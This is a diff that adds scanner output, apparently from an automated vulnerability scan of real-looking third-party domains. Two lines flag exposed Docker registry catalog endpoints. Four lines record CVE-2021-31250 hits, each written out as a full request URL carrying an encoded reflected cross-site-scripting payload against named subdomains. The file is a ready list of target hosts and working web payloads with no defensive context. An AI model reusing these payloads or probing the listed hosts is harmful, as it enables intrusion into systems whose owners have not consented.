@@ -1,0 +1,6 @@
+[docker-registry] [http] [medium] https://tcr.s1.us-central-8a.cloud.together.ai/v2/_catalog
+[docker-registry] [http] [medium] https://tcr.s2.us-central-8a.cloud.together.ai/v2/_catalog
+[CVE-2021-31250] [http] [medium] http://stg.builder-relay-mainnet.blocknative.com/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%283FIobPdmJ0oezUCZBVxNUfa0yXR%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY
+[CVE-2021-31250] [http] [medium] http://stg.builder-relay-goerli.blocknative.com/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%283FIobPdmJ0oezUCZBVxNUfa0yXR%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY
+[CVE-2021-31250] [http] [medium] http://stg.builder-relay-ropsten.blocknative.com/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%283FIobPdmJ0oezUCZBVxNUfa0yXR%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY
+[CVE-2021-31250] [http] [medium] http://telegram.blocknative.com/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%283FIobPdmJ0oezUCZBVxNUfa0yXR%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY
